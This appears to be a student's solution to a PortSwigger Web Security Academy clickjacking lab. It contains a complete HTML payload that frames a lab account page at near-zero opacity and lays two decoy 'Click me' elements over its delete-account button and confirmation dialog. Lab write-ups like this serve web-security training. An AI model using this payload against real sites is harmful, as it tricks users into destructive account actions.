# Multi### stepclickjacking

## This lab has some account functionality that is protected by a [CSRF](https://portswigger.net/web-security/csrf) token and also has a confirmation dialog to protect against [Clickjacking](https://portswigger.net/web-security/clickjacking). To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

## You can log in to the account yourself using the following credentials: `wiener:peter`

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 700px;
    opacity: 0.0001;
    z-index: 2;
  }

  .firstClick,
  .secondClick {
    position: absolute;
    top: 497px;
    left: 60px;
    z-index: 1;
  }
  .secondClick {
    top: 295px;
    left: 208px;
  }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe
  src="https://0a29006803c165ae8292162000de007e.web-security-academy.net/my-account"
></iframe>
```
